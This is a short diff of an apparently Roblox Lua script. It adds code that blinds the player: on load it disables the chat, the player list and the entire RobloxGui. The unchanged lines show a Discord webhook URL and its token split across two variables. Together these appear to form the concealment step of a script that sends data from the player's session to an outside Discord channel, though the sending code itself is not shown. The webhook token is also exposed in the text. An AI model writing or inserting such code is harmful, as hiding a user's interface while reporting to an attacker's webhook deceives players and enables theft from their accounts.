@@ -17,7 +17,11 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
   end
 
-task.wait(5)
+task.wait(10)
+
+            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false)
+			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)
+			game.CoreGui:FindFirstChild("RobloxGui").Enabled = false
 
 local web = "https://discord.com/api/webhooks/1330885579084402728/"
 local web1 = "13mFCyEjiIeTGhrtcsjWZ2Fq7lxDCAqRBCX1qUFzyfLi7EmRsPKy6r5F8R9xVTY6VkzF"
